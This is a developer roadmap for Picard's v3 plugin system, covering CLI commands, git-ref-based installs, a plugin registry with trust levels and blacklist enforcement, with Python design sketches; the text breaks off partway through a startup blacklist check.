# Picard Plugin v3 Development Roadmap

**Document Version:** 1.0
**Last Updated:** 2025-11-24
**Status:** Work in Progress

---

## Current State

### Branch Status

| Branch | Owner | Status | Description |
|--------|-------|--------|-------------|
| `phw/plugins-v3` | phw | Active WIP | Core plugin infrastructure, manifest parsing, PluginApi, basic manager |
| `phw/plugins-v3-cli` | phw | Reference | Basic CLI implementation with install/uninstall/enable/disable |
| `master` | - | Stable | Production code with legacy plugin system |

### What Works Now

**Core Infrastructure (phw/plugins-v3):**
- ✅ Plugin discovery from `plugins3/` directory
- ✅ MANIFEST.toml parsing with metadata
- ✅ PluginApi with all major extension points
- ✅ Plugin loading and module execution
- ✅ Git-based plugin sources (pygit2)
- ✅ Basic unit tests

**CLI (phw/plugins-v3-cli):**
- ✅ `picard plugins --list`
- ✅ `picard plugins --install <url>`
- ✅ `picard plugins --uninstall <name>`
- ✅ `picard plugins --enable <name>`
- ✅ `picard plugins --disable <name>`

### What Doesn't Work

**Critical Gaps:**
- ❌ Plugin state not persisted (enable/disable forgotten on restart)
- ❌ All plugins auto-load on startup regardless of state
- ❌ No API version compatibility checking
- ❌ No plugin updates (must uninstall/reinstall)
- ❌ No plugin info/details command
- ❌ No official plugin repository/discovery
- ❌ No error handling or user feedback
- ❌ No GUI

---

## Phase 1: Functional CLI-Only System

**Goal:** Make plugin system usable for developers and power users via CLI only.

### 1.1 Configuration Persistence (CRITICAL)

**Priority:** P0 - Blocker
**Effort:** 2-3 days

**Tasks:**
- [ ] Add `plugins3` section to config schema
- [ ] Store enabled plugin list: `config.setting['plugins3']['enabled_plugins'] = []`
- [ ] Store plugin metadata cache: version, git ref, last update
- [ ] Implement `PluginManager.save_config()` / `load_config()`
- [ ] Update `enable_plugin()` to persist state
- [ ] Update `disable_plugin()` to persist state
- [ ] Update `init_plugins()` to only load enabled plugins

**Files to modify:**
- `picard/const/defaults.py` - add default config structure
- `picard/plugin3/manager.py` - add config load/save methods
- `picard/config.py` - may need schema updates

**Acceptance criteria:**
- Enabled plugins survive restart
- Disabled plugins don't load on startup
- Config file contains plugin state

---

### 1.2 Version Compatibility Checking

**Priority:** P0 - Blocker
**Effort:** 1 day

**Tasks:**
- [ ] Implement `_compatible_api_versions()` check in manager
- [ ] Add warning log for incompatible plugins
- [ ] Skip loading incompatible plugins
- [ ] Add `--force` flag to enable incompatible plugins (at user risk)
- [ ] Show compatibility status in `--list` output

**Files to modify:**
- `picard/plugin3/manager.py` - enhance `_load_plugin()`
- `picard/plugin3/cli.py` - add compatibility info to list

**Acceptance criteria:**
- Plugins with wrong API version don't load
- Clear error message explains why
- User can see which API versions plugin requires

---

### 1.3 Enhanced CLI Output & Error Handling

**Priority:** P1 - High
**Effort:** 2 days

**Tasks:**
- [ ] Improve `--list` output: show version, status (enabled/disabled), API versions, description
- [ ] Add `--info <name|url>` command to show full plugin details
- [ ] Add error handling for all operations (network, git, file system)
- [ ] Add confirmation prompts for destructive operations (uninstall)
- [ ] Add `--yes` flag to skip confirmations
- [ ] Show progress for git clone operations
- [ ] Return proper exit codes (0=success, 1=error)

**Files to modify:**
- `picard/plugin3/cli.py` - enhance all methods
- `picard/plugin3/plugin.py` - better error messages

**Example output:**
```
$ picard plugins --list
Installed plugins:
  example (enabled)
    Version: 1.0.0
    API: 3.0, 3.1
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/example
    Description: This is an example plugin

  lastfm (disabled)
    Version: 2.1.0
    API: 3.0
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/lastfm
    Description: Last.fm integration
```

---

### 1.4 Plugin Updates

**Priority:** P1 - High
**Effort:** 1-2 days

**Tasks:**
- [ ] Add `--update <name>` command to update single plugin
- [ ] Add `--update-all` command to update all plugins
- [ ] Store git remote URL in config for each plugin
- [ ] Implement `PluginSourceGit.update()` method (fetch + reset)
- [ ] Show what changed (old version → new version)
- [ ] Handle update failures gracefully (rollback?)

**Files to modify:**
- `picard/plugin3/cli.py` - add update commands
- `picard/plugin3/manager.py` - add update methods
- `picard/plugin3/plugin.py` - enhance PluginSourceGit

**Acceptance criteria:**
- Can update installed plugins from git
- Shows version changes
- Handles network failures

---

### 1.5 Plugin State Management

**Priority:** P1 - High
**Effort:** 1 day

**Tasks:**
- [ ] Add plugin state enum: `DISCOVERED`, `LOADED`, `ENABLED`, `DISABLED`, `ERROR`
- [ ] Track state in `Plugin` class
- [ ] Prevent double-enable, double-disable
- [ ] Add `--status` command to show detailed state
- [ ] Log state transitions

**Files to modify:**
- `picard/plugin3/plugin.py` - add state tracking
- `picard/plugin3/manager.py` - check state before operations

---

### 1.6 Git Ref/Branch Support

**Priority:** P2 - Medium
**Effort:** 1-2 days

**Goal:** Allow developers to install and test specific branches, tags, or commits.

**Tasks:**
- [ ] Add `--ref <branch|tag|commit>` option to install command
- [ ] Store ref in config per plugin
- [ ] Update to specific ref
- [ ] Show current ref in `--list` and `--info`
- [ ] Add `--switch-ref <plugin> <ref>` command to change ref without reinstalling
- [ ] Handle ref changes on update

**Files to modify:**
- `picard/plugin3/cli.py` - add --ref argument
- `picard/plugin3/plugin.py` - pass ref to PluginSourceGit
- `picard/plugin3/manager.py` - store ref in config

---

#### Detailed Design: Git Ref Support

**1. Install with specific ref:**

```bash
# Install from main branch (default)
picard plugins --install https://github.com/user/plugin

# Install from specific branch
picard plugins --install https://github.com/user/plugin --ref dev
picard plugins --install https://github.com/user/plugin --ref feature/new-api

# Install from specific tag
picard plugins --install https://github.com/user/plugin --ref v1.0.0
picard plugins --install https://github.com/user/plugin --ref v2.1.0-beta

# Install from specific commit
picard plugins --install https://github.com/user/plugin --ref a1b2c3d4
```

**2. Switch ref after installation:**

```bash
# Switch to different branch
picard plugins --switch-ref myplugin dev

# Switch to tag
picard plugins --switch-ref myplugin v1.1.0

# Switch back to main
picard plugins --switch-ref myplugin main
```

**3. Update behavior:**

```bash
# Update to latest commit on current ref
picard plugins --update myplugin

# Update and switch ref
picard plugins --update myplugin --ref v2.0.0
```

**4. List shows current ref:**

```bash
$ picard plugins --list

Installed plugins:
  lastfm (enabled)
    Version: 2.1.0
    Git ref: main @ a1b2c3d
    API: 3.0
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/lastfm

  discogs (enabled)
    Version: 1.5.0-dev
    Git ref: dev @ f4e5d6c
    API: 3.0, 3.1
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/discogs

  custom-plugin (disabled)
    Version: 0.9.0
    Git ref: v0.9.0 (tag)
    API: 3.0
    Path: ~/.local/share/MusicBrainz/Picard/plugins3/custom-plugin
```

**5. Info shows ref details:**

```bash
$ picard plugins --info lastfm

Plugin: Last.fm Scrobbler
Status: enabled
Version: 2.1.0
Git URL: https://github.com/metabrainz/picard-plugin-lastfm
Git ref: main
Current commit: a1b2c3d4e5f6 (2025-11-20)
Commit message: Fix authentication bug
API versions: 3.0
Path: ~/.local/share/MusicBrainz/Picard/plugins3/lastfm
Description: Scrobble your music to Last.fm
```

---

#### Implementation Details

**1. Config storage:**

```python
# In config
config.setting['plugins3']['installed_plugins'] = {
    'lastfm': {
        'git_url': 'https://github.com/metabrainz/picard-plugin-lastfm',
        'ref': 'main',  # branch, tag, or commit
        'ref_type': 'branch',  # 'branch', 'tag', or 'commit'
        'current_commit': 'a1b2c3d4e5f6',
        'enabled': True,
        'installed_at': '2025-11-24T15:00:00Z',
        'last_updated': '2025-11-24T15:00:00Z'
    },
    'discogs': {
        'git_url': 'https://github.com/user/picard-plugin-discogs',
        'ref': 'dev',
        'ref_type': 'branch',
        'current_commit': 'f4e5d6c7a8b9',
        'enabled': True,
        'installed_at': '2025-11-20T10:00:00Z',
        'last_updated': '2025-11-23T14:30:00Z'
    }
}
```

**2. PluginSourceGit enhancement:**

```python
class PluginSourceGit(PluginSource):
    def __init__(self, url: str, ref: str = None):
        super().__init__()
        self.url = url
        self.ref = ref or 'main'  # Default to main
        self.ref_type = None  # Detected during sync
        self.is_local = self._is_local_repo(url)

    def _is_local_repo(self, url):
        """Check if URL is a local git repository"""
        from pathlib import Path

        # Not a URL scheme, could be local path
        if not url.startswith(('http://', 'https://', 'git://', 'ssh://', 'git@')):
            path = Path(url).expanduser().resolve()
            # Check if it's a git repository
            if path.exists() and (path / '.git').exists():
                return True
        return False

    def sync(self, target_directory: Path):
        """Clone or update repository and checkout ref"""
        if target_directory.is_dir():
            repo = pygit2.Repository(target_directory.absolute())
            # Fetch all refs
            for remote in repo.remotes:
                remote.fetch(callbacks=GitRemoteCallbacks())
        else:
            # Clone from local or remote
            if self.is_local:
                # Resolve to absolute path for local repos
                from pathlib import Path
                local_path = Path(self.url).expanduser().resolve()
                print(f'Cloning from local repository {local_path}')
                repo = pygit2.clone_repository(
                    str(local_path),
                    target_directory.absolute(),
                    callbacks=GitRemoteCallbacks()
                )
            else:
                print(f'Cloning from {self.url}')
                repo = pygit2.clone_repository(
                    self.url,
                    target_directory.absolute(),
                    callbacks=GitRemoteCallbacks()
                )

        # Resolve ref to commit
        commit = self._resolve_ref(repo, self.ref)

        # Hard reset to commit
        repo.reset(commit.id, pygit2.enums.ResetMode.HARD)

        return {
            'commit': str(commit.id)[:12],
            'ref': self.ref,
            'ref_type': self.ref_type,
            'commit_time': commit.commit_time,
            'commit_message': commit.message.strip(),
            'is_local': self.is_local
        }

    def _resolve_ref(self, repo, ref: str):
        """Resolve ref to commit, detect type"""
        # Try as branch
        try:
            branch = repo.branches.get(f'origin/{ref}')
            if branch:
                self.ref_type = 'branch'
                return branch.peel()
        except KeyError:
            pass

        # Try as tag
        try:
            tag_ref = repo.references.get(f'refs/tags/{ref}')
            if tag_ref:
                self.ref_type = 'tag'
                return tag_ref.peel()
        except KeyError:
            pass

        # Try as commit hash
        try:
            commit = repo.revparse_single(ref)
            self.ref_type = 'commit'
            return commit
        except KeyError:
            raise PluginSourceSyncError(f"Could not resolve ref: {ref}")
```

**Usage with local git repositories:**

```bash
# Install from local git repository (absolute path)
picard plugins --install /home/user/dev/my-plugin

# Install from local git repository (relative path)
picard plugins --install ./my-plugin
picard plugins --install ../picard-plugin-lastfm

# Install from local git repository with specific ref
picard plugins --install ~/dev/my-plugin --ref dev

# Install from remote URL (works as before)
picard plugins --install https://github.com/user/plugin
```

**Development workflow:**

```bash
# Developer working on a plugin
cd ~/dev/picard-plugin-lastfm

# Make changes
vim __init__.py

# Commit changes
git add .
git commit -m "Add new feature"

# Test in Picard immediately (no need to push to GitHub)
picard plugins --install ~/dev/picard-plugin-lastfm --reinstall

# Or update if already installed
picard plugins --update lastfm

# Switch between branches for testing
picard plugins --switch-ref lastfm feature/new-api
```

**Benefits:**
- ✅ Test plugins without pushing to remote
- ✅ Faster development iteration
- ✅ Works offline
- ✅ Test local changes immediately
- ✅ No need for local web server or file:// URLs
- ✅ Supports both absolute and relative paths
- ✅ Expands ~ for home directory

**Local repository detection:**
- Checks if path doesn't start with URL scheme
- Checks if path exists and contains `.git` directory
- Resolves relative paths and ~ expansion
- Falls back to remote clone if not a local repo

**Note:** Local repositories are cloned (not symlinked) to the plugins directory, so changes in the source repo require reinstall or update to take effect.

---

**3. CLI commands:**

```python
class PluginCLI:
    def _install_plugins(self, plugin_urls):
        ref = self._args.ref or 'main'

        for url in plugin_urls:
            print(f"Installing plugin from {url} (ref: {ref})")
            self._manager.install_plugin(url, ref=ref)

    def _switch_ref(self, plugin_name, new_ref):
        """Switch plugin to different ref"""
        plugin = self._manager.get_plugin(plugin_name)
        if not plugin:
            print(f"Plugin not found: {plugin_name}")
            return 1

        print(f"Switching {plugin_name} to ref: {new_ref}")

        # Disable plugin
        if plugin.is_enabled():
            self._manager.disable_plugin(plugin)

        # Sync to new ref
        source = PluginSourceGit(plugin.git_url, ref=new_ref)
        plugin.sync(source)

        # Update config
        self._manager.update_plugin_ref(plugin_name, new_ref)

        # Re-enable if was enabled
        if plugin.was_enabled:
            self._manager.enable_plugin(plugin)

        print(f"Successfully switched to {new_ref}")
```

**4. Argument parser:**

```python
plugin_parser.add_argument(
    '-i', '--install',
    nargs='+',
    metavar='URL',
    help="install plugin(s) from URL(s)"
)
plugin_parser.add_argument(
    '--ref',
    metavar='REF',
    help="git ref (branch, tag, or commit) to install/update to"
)
plugin_parser.add_argument(
    '--switch-ref',
    nargs=2,
    metavar=('PLUGIN', 'REF'),
    help="switch plugin to different git ref"
)
```

---

#### Use Cases

**1. Developer testing new feature:**
```bash
# Install dev branch
picard plugins --install https://github.com/me/my-plugin --ref dev

# Test it
picard

# Switch to specific feature branch
picard plugins --switch-ref my-plugin feature/new-api

# Test again
picard

# Switch back to stable
picard plugins --switch-ref my-plugin main
```

**2. User wants specific version:**
```bash
# Install latest stable tag
picard plugins --install https://github.com/user/plugin --ref v1.2.0

# Later, update to newer tag
picard plugins --update plugin --ref v1.3.0
```

**3. Bisecting a bug:**
```bash
# Try specific commit
picard plugins --switch-ref plugin a1b2c3d4

# Test
picard

# Try earlier commit
picard plugins --switch-ref plugin e5f6a7b8
```

**4. Beta testing:**
```bash
# Install beta tag
picard plugins --install https://github.com/user/plugin --ref v2.0.0-beta1

# Update to next beta
picard plugins --update plugin --ref v2.0.0-beta2

# Switch to stable when released
picard plugins --switch-ref plugin v2.0.0
```

---

#### Edge Cases to Handle

1. **Ref doesn't exist:**
   ```
   ERROR: Ref 'nonexistent' not found in repository
   Available branches: main, dev, feature/test
   Available tags: v1.0.0, v1.1.0, v2.0.0-beta
   ```

2. **Detached HEAD warning:**
   ```
   WARNING: Switching to commit a1b2c3d4 will put plugin in detached HEAD state.
   Updates will not work until you switch to a branch.
   Continue? [y/N]
   ```

3. **Incompatible API version on different ref:**
   ```
   ERROR: Ref 'v0.9.0' requires API version 2.0, but Picard 3.0 only supports API 3.0+
   Plugin will not be enabled.
   ```

4. **Dirty working directory:**
   ```
   WARNING: Plugin 'myplugin' has local modifications that will be lost.
   Modified files:
     - __init__.py
     - config.py
   Continue? [y/N]
   ```

---

**Acceptance criteria:**
- [ ] Can install from any branch, tag, or commit
- [ ] Can switch between refs without reinstalling
- [ ] Config stores current ref and commit
- [ ] List/info shows ref information
- [ ] Update respects current ref (or switches if --ref specified)
- [ ] Clear error messages for invalid refs
- [ ] Handles edge cases gracefully

---

### 1.7 Better Install Logic

**Priority:** P2 - Medium
**Effort:** 1 day

**Tasks:**
- [ ] Derive plugin name from MANIFEST.toml, not URL basename
- [ ] Check if plugin already installed before cloning
- [ ] Add `--reinstall` flag to force reinstall
- [ ] Validate MANIFEST.toml before completing install
- [ ] Clean up on install failure

**Files to modify:**
- `picard/plugin3/manager.py` - enhance `install_plugin()`

---

### 1.8 Basic Blacklist Support (Safety Critical)

**Priority:** P1 - High (Security)
**Effort:** 1 day

**Tasks:**
- [ ] Add `PluginRegistry` class with blacklist checking
- [ ] Fetch plugin registry from website (with caching)
- [ ] Check blacklist before install
- [ ] Show warning and refuse install if blacklisted
- [ ] Add `--force-blacklisted` flag to override (with big warning)
- [ ] Check installed plugins on startup, disable if blacklisted

**Files to create:**
- `picard/plugin3/registry.py`

**Files to modify:**
- `picard/plugin3/manager.py` - add blacklist checks

**Note:** Full registry features (browse, search) come in Phase 3. This task only implements safety-critical blacklist checking.

---

## Phase 2: Polish & Robustness

**Goal:** Make CLI system production-ready.

### 2.1 Comprehensive Testing

**Priority:** P1 - High
**Effort:** 3-4 days

**Tasks:**
- [ ] Unit tests for all manager operations
- [ ] Integration tests for CLI commands
- [ ] Test error conditions (network failure, invalid manifest, etc.)
- [ ] Test config persistence
- [ ] Test version compatibility logic
- [ ] Mock git operations for faster tests

---

### 2.2 Documentation

**Priority:** P1 - High
**Effort:** 2 days

**Tasks:**
- [ ] Update PLUGINS.md with implementation decisions
- [ ] Write CLI usage guide
- [ ] Document plugin development workflow
- [ ] Add examples for common operations
- [ ] Document config file format

---

### 2.3 Migration from Legacy Plugins

**Priority:** P1 - High
**Effort:** 3-4 days

**Tasks:**
- [ ] Write comprehensive migration guide
- [ ] Create automated migration script (`picard-plugin-migrate`)
- [ ] Test migration script on popular v2 plugins
- [ ] Document breaking changes
- [ ] Create before/after examples
- [ ] Provide migration checklist
- [ ] Announce breaking change to plugin developers
- [ ] Offer migration assistance to popular plugin authors

**Files to create:**
- `scripts/migrate-plugin.py` - Migration tool
- `docs/PLUGIN_MIGRATION.md` - Migration guide

**Deliverables:**
- Migration tool that converts 80% of simple plugins automatically
- Clear documentation of manual steps needed
- List of breaking changes
- Communication plan for plugin developers

---

## Phase 3: Official Plugin Repository (Future)

**Goal:** Enable plugin discovery and safety via official plugin list on website.

### 3.1 Website Plugin Registry API

**Priority:** P1 - High
**Effort:** Website team - 3-5 days

**Design:**

The Picard website will serve a JSON endpoint with official plugin metadata:

**Endpoint:** `https://picard.musicbrainz.org/api/v3/plugins.json`

**Response format:**
```json
{
  "api_version": "3.0",
  "last_updated": "2025-11-24T15:30:00Z",
  "plugins": [
    {
      "id": "lastfm",
      "name": "Last.fm",
      "description": "Last.fm integration for scrobbling and metadata",
      "git_url": "https://github.com/metabrainz/picard-plugin-lastfm",
      "category": "metadata",
      "trust_level": "picard_team",
      "author": "MusicBrainz Picard Team",
      "min_api_version": "3.0",
      "max_api_version": "3.1"
    },
    {
      "id": "discogs",
      "name": "Discogs",
      "description": "Discogs metadata provider",
      "git_url": "https://github.com/rdswift/picard-plugin-discogs",
      "category": "metadata",
      "trust_level": "trusted_author",
      "author": "Bob Swift",
      "min_api_version": "3.0"
    },
    {
      "id": "custom-tagger",
      "name": "Custom Tagger",
      "description": "Custom tagging rules",
      "git_url": "https://github.com/someuser/picard-plugin-custom",
      "category": "metadata",
      "trust_level": "community",
      "author": "John Doe",
      "min_api_version": "3.0"
    }
  ],
  "blacklist": [
    {
      "git_url": "https://github.com/badactor/malicious-plugin",
      "reason": "Contains malicious code",
      "blacklisted_at": "2025-11-20T10:00:00Z"
    },
    {
      "git_url": "https://github.com/user/broken-plugin",
      "reason": "Causes data corruption",
      "blacklisted_at": "2025-11-15T14:30:00Z"
    }
  ],
  "trusted_authors": [
    {
      "name": "Bob Swift",
      "github_username": "rdswift",
      "added_at": "2025-01-15T10:00:00Z"
    },
    {
      "name": "Philipp Wolfer",
      "github_username": "phw",
      "added_at": "2025-01-15T10:00:00Z"
    }
  ]
}
```

---

#### Trust Levels

The registry categorizes plugins into four trust levels:

**1. `picard_team` - Picard Team Plugins**
- **Definition:** Plugins maintained by the MusicBrainz Picard team
- **Repository:** Under `metabrainz` or `musicbrainz` GitHub organizations
- **Code review:** Full code review by Picard team before acceptance
- **Updates:** Reviewed before being listed
- **Badge:** 🛡️ "Picard Team" badge in UI
- **User trust:** Highest - users can install without warnings

**Examples:**
- Last.fm plugin
- AcoustID plugin
- Cover Art Archive plugin

**2. `trusted_author` - Trusted Authors**
- **Definition:** Plugins by known, trusted community members
- **Criteria:**
  - Long-term contributors to Picard or MusicBrainz
  - History of quality plugins
  - Manually approved by Picard team
- **Code review:** NOT reviewed by Picard team
- **Updates:** Automatically listed (no review)
- **Badge:** ✓ "Trusted Author" badge in UI
- **User trust:** High - minimal warning on first install

**Examples:**
- Plugins by Bob Swift (rdswift)
- Plugins by Philipp Wolfer (phw)
- Plugins by other long-term contributors

**3. `community` - Community Plugins**
- **Definition:** Plugins by other authors
- **Criteria:**
  - Valid MANIFEST.toml
  - Not blacklisted
  - Submitted to registry
- **Code review:** NOT reviewed
- **Updates:** Automatically listed
- **Badge:** ⚠️ "Community" badge in UI
- **User trust:** Lower - clear warning on install

**Examples:**
- New plugins by unknown authors
- Experimental plugins
- Personal/niche plugins

**4. `unregistered` - Unregistered Plugins**
- **Definition:** Plugins not in the official registry
- **Criteria:**
  - URL not found in registry
  - Could be in development
  - Could be from unknown source
  - Could be private/personal plugin
- **Code review:** NOT reviewed
- **Updates:** Not tracked by registry
- **Badge:** 🔓 "Unregistered" badge in UI
- **User trust:** Lowest - strongest warning on install

**Examples:**
- Plugin in development (developer testing)
- Private company plugins
- Personal forks
- Plugins from unknown sources

**Use cases for unregistered plugins:**
- **Developers:** Test plugin during development before submitting to registry
- **Private use:** Company-internal plugins not meant for public
- **Forks:** Personal modifications of existing plugins
- **Experimental:** Proof-of-concept plugins not ready for registry

---

#### Trust Level Behavior

**Installation warnings:**

```bash
# Picard Team plugin - no warning
$ picard plugins --install lastfm
Installing Last.fm (Picard Team)...
✓ Installed successfully

# Trusted Author plugin - minimal warning
$ picard plugins --install discogs
Installing Discogs by Bob Swift (Trusted Author)...
Note: This plugin is not reviewed by the Picard team.
Continue? [Y/n] y
✓ Installed successfully

# Community plugin - clear warning
$ picard plugins --install custom-tagger
Installing Custom Tagger by John Doe (Community)...

⚠️  WARNING: This plugin is not reviewed or endorsed by the Picard team.
   It may contain bugs or security issues.
   Only install if you trust the author.

Continue? [y/N] y
✓ Installed successfully

# Unregistered plugin - strongest warning
$ picard plugins --install https://github.com/unknown/random-plugin
Installing plugin from https://github.com/unknown/random-plugin...

🔓 SECURITY WARNING: This plugin is NOT in the official registry.

   This plugin could be:
   - A plugin in development (safe if you're the developer)
   - A private/personal plugin (safe if you trust the source)
   - A malicious plugin (DANGEROUS!)

   This plugin will have FULL ACCESS to:
   - Your music files and metadata
   - Your Picard configuration (including passwords)
   - Your entire file system
   - Network access (can send data anywhere)

   Plugin: random-plugin
   Author: Unknown
   Source: https://github.com/unknown/random-plugin
   Trust Level: UNREGISTERED

   ⚠️  ONLY INSTALL IF YOU COMPLETELY TRUST THIS SOURCE!

Continue? [y/N]
```

**List output with trust indicators:**

```bash
$ picard plugins --browse

Official Plugins:

Picard Team:
  🛡️ lastfm - Last.fm integration
  🛡️ acoustid - AcoustID fingerprinting
  🛡️ caa - Cover Art Archive

Trusted Authors:
  ✓ discogs (Bob Swift) - Discogs metadata
  ✓ fanart (Philipp Wolfer) - Fanart.tv cover art

Community:
  ⚠️ custom-tagger (John Doe) - Custom tagging rules
  ⚠️ lyrics-plugin (Jane Smith) - Lyrics fetcher

Unregistered:
  🔓 my-dev-plugin (You) - Plugin in development
  🔓 company-internal (ACME Corp) - Internal use only
```

**Filtering by trust level:**

```bash
# Show only Picard Team plugins
picard plugins --browse --trust picard_team

# Show Picard Team + Trusted Authors
picard plugins --browse --trust picard_team,trusted_author

# Show all (default)
picard plugins --browse
```

---

#### Managing Trust Levels

**Adding trusted authors (admin only):**

Website admin interface:
1. Navigate to "Trusted Authors" section
2. Add GitHub username
3. Specify name and date
4. All plugins from that GitHub account automatically get `trusted_author` level

**Promoting community plugin to trusted author:**
1. Author proves track record with quality plugins
2. Picard team votes to add to trusted authors list
3. Admin adds GitHub username to trusted authors
4. All author's plugins automatically upgraded to `trusted_author`

**Promoting to Picard Team:**
1. Plugin moved to `metabrainz` organization
2. Code reviewed by team
3. Manually set `trust_level: picard_team` in registry
4. Plugin gets team badge

**Demoting trusted author:**
1. If author's plugin has security issue or quality problems
2. Admin removes from trusted authors list
3. All author's plugins downgraded to `community`
4. Users see warning on next update

---

#### Registry Schema

**Plugin entry:**
```json
{
  "id": "plugin-name",
  "name": "Display Name",
  "description": "Description",
  "git_url": "https://github.com/user/repo",
  "category": "metadata|coverart|ui|scripting|formats|other",
  "trust_level": "picard_team|trusted_author|community",
  "author": "Author Name",
  "author_github": "github-username",
  "min_api_version": "3.0",
  "max_api_version": "3.1",
  "added_at": "2025-11-24T15:00:00Z",
  "updated_at": "2025-11-24T15:00:00Z"
}
```

**Trusted authors list:**
```json
{
  "trusted_authors": [
    {
      "name": "Bob Swift",
      "github_username": "rdswift",
      "added_at": "2025-01-15T10:00:00Z",
      "added_by": "admin-username"
    }
  ]
}
```

---

#### Automatic Trust Level Detection

When plugin is submitted to registry:

1. **Check if repository is under `metabrainz` or `musicbrainz` org:**
   - YES → Requires manual approval by team → `picard_team`
   - NO → Continue to step 2

2. **Check if author's GitHub username is in trusted authors list:**
   - YES → Automatically set `trusted_author`
   - NO → Set `community`

3. **Check if plugin is blacklisted:**
   - YES → Reject submission
   - NO → Accept with appropriate trust level

---

**Tasks:**
- [ ] Design JSON schema with trust levels
- [ ] Implement endpoint on website
- [ ] Add admin interface for managing plugins and trusted authors
- [ ] Add submission workflow (GitHub PR or web form)
- [ ] Implement automatic trust level detection
- [ ] Add review process for Picard Team plugins
- [ ] Implement blacklist management
- [ ] Add versioning/caching headers
- [ ] Add trusted authors management interface

---

### 3.2 Picard Client Integration

**Priority:** P1 - High
**Effort:** 3-4 days

**Tasks:**
- [ ] Add `PluginRegistry` class to fetch and cache plugin list
- [ ] Cache registry locally (refresh every 24h or on demand)
- [ ] Check blacklist before install
- [ ] Check trust level and show appropriate warnings
- [ ] Show warning if installing blacklisted plugin
- [ ] Add `--force-blacklisted` flag to override
- [ ] Add `--trust-community` flag to skip community plugin warnings
- [ ] Add `--check-blacklist <url>` command to verify safety
- [ ] Add `--refresh-registry` to force update cache

**Files to create:**
- `picard/plugin3/registry.py` - PluginRegistry class

**Example implementation:**
```python
class PluginRegistry:
    REGISTRY_URL = "https://picard.musicbrainz.org/api/v3/plugins.json"
    CACHE_FILE = "plugin_registry.json"
    CACHE_TTL = 86400  # 24 hours

    TRUST_LEVELS = {
        'picard_team': 3,      # Highest trust
        'trusted_author': 2,   # Medium trust
        'community': 1         # Lowest trust
    }

    def fetch_registry(self):
        """Fetch plugin list from website, use cache if fresh"""

    def is_blacklisted(self, git_url):
        """Check if git URL is blacklisted"""

    def get_blacklist_reason(self, git_url):
        """Get reason for blacklisting"""

    def get_trust_level(self, git_url):
        """Get trust level for plugin by git URL"""

    def is_trusted_author(self, github_username):
        """Check if GitHub username is in trusted authors list"""

    def find_plugin(self, name_or_id):
        """Find official plugin by name or ID"""

    def list_official_plugins(self, category=None, trust_level=None):
        """List all official plugins, optionally filtered by category and trust level"""

    def should_warn_on_install(self, git_url):
        """Determine if warning should be shown based on trust level"""
        plugin = self.find_plugin_by_url(git_url)
        if not plugin:
            return True, "Plugin not in official registry"

        trust = plugin.get('trust_level')
        if trust == 'picard_team':
            return False, None
        elif trust == 'trusted_author':
            return True, "not reviewed by Picard team"
        else:  # community
            return True, "not reviewed or endorsed by Picard team"
```

---

**Local File Support for Testing:**

The PluginRegistry can load from a local JSON file instead of URL for testing:

```python
# Support both URL and local file
def __init__(self, registry_source=None):
    """Initialize registry

    Args:
        registry_source: URL or local file path to registry JSON.
                       If None, uses default REGISTRY_URL.
                       Can be overridden with PICARD_PLUGIN_REGISTRY env var.
    """
    import os

    # Priority: parameter > env var > default URL
    self.registry_source = (
        registry_source or
        os.environ.get('PICARD_PLUGIN_REGISTRY') or
        self.REGISTRY_URL
    )

def _is_local_file(self, source):
    """Check if source is a local file path"""
    from pathlib import Path

    if source.startswith('http://') or source.startswith('https://'):
        return False

    path = Path(source)
    return path.exists() and path.is_file()

def fetch_registry(self, force_refresh=False):
    """Fetch from URL or load from local file"""
    if self._is_local_file(self.registry_source):
        log.debug('Loading plugin registry from local file: %s', self.registry_source)
        return self._load_from_file(self.registry_source)
    else:
        log.debug('Fetching plugin registry from URL: %s', self.registry_source)
        return self._fetch_from_url(self.registry_source)
```

**Usage:**

```bash
# Use local file for testing
export PICARD_PLUGIN_REGISTRY=./test/data/test-registry.json
picard plugins --list

# Use staging server
export PICARD_PLUGIN_REGISTRY=https://staging.picard.musicbrainz.org/api/v3/plugins.json

# Use production (default)
unset PICARD_PLUGIN_REGISTRY
```

**Test registry file (`test/data/test-registry.json`):**

```json
{
  "api_version": "3.0",
  "last_updated": "2025-11-24T17:00:00Z",
  "plugins": [
    {
      "id": "test-plugin",
      "name": "Test Plugin",
      "git_url": "https://github.com/test/picard-plugin-test",
      "category": "metadata",
      "trust_level": "community",
      "author": "Test Author"
    }
  ],
  "blacklist": [
    {
      "git_url": "https://github.com/test/blacklisted-plugin",
      "reason": "Test blacklist entry",
      "blacklisted_at": "2025-11-24T10:00:00Z"
    }
  ],
  "trusted_authors": []
}
```

**Benefits:**
- ✅ No web server needed during development
- ✅ Test blacklist behavior easily
- ✅ Fast iteration (no network delays)
- ✅ Works offline
- ✅ Version control test registries

---

**Priority:** P2 - Medium
**Effort:** 2 days

**Tasks:**
- [ ] Add `--browse` command to list official plugins
- [ ] Add `--search <term>` command to search official plugins
- [ ] Add `--info <name>` to show details of official plugin
- [ ] Allow install by name for official plugins: `picard plugins --install lastfm`
- [ ] Show "official" badge in `--list` output
- [ ] Add `--category <cat>` filter for browse

**Example usage:**
```bash
# Browse official plugins
picard plugins --browse
picard plugins --browse --category metadata

# Search
picard plugins --search "last.fm"

# Install by name (official plugins only)
picard plugins --install lastfm

# Install by URL (any plugin)
picard plugins --install https://github.com/user/custom-plugin

# Check if URL is blacklisted
picard plugins --check-blacklist https://github.com/badactor/plugin

# Force install blacklisted plugin (dangerous!)
picard plugins --install https://github.com/badactor/plugin --force-blacklisted
```

---

### 3.4 Blacklist Enforcement

**Priority:** P0 - Critical for safety
**Effort:** 1-2 days

**Behavior:**

1. **On install:**
   - Check git URL against blacklist
   - If blacklisted: show error with reason, refuse install
   - If `--force-blacklisted`: show big warning, require confirmation, install anyway

2. **On startup:**
   - Check all installed plugins against blacklist (including unregistered)
   - If blacklisted plugin found:
     - Disable it automatically
     - Show warning in log
     - Add notification in UI (future)
     - Store in config that plugin was auto-disabled
   - User can re-enable if they choose (with `--force-blacklisted`)

3. **On update:**
   - Re-check blacklist
   - Refuse to update to blacklisted version

4. **Periodic check:**
   - Check blacklist every 24 hours (when registry refreshes)
   - Disable newly-blacklisted plugins
   - Notify user

---

**Implementation Details:**

**Startup check:**
```python
# In picard/plugin3/manager.py

def init_plugins(self):
    """Initialize plugins on startup"""
    registry = PluginRegistry()

    for plugin in self._plugins:
        # Check if plugin is blacklisted
        if registry.is_blacklisted(plugin.git_url):
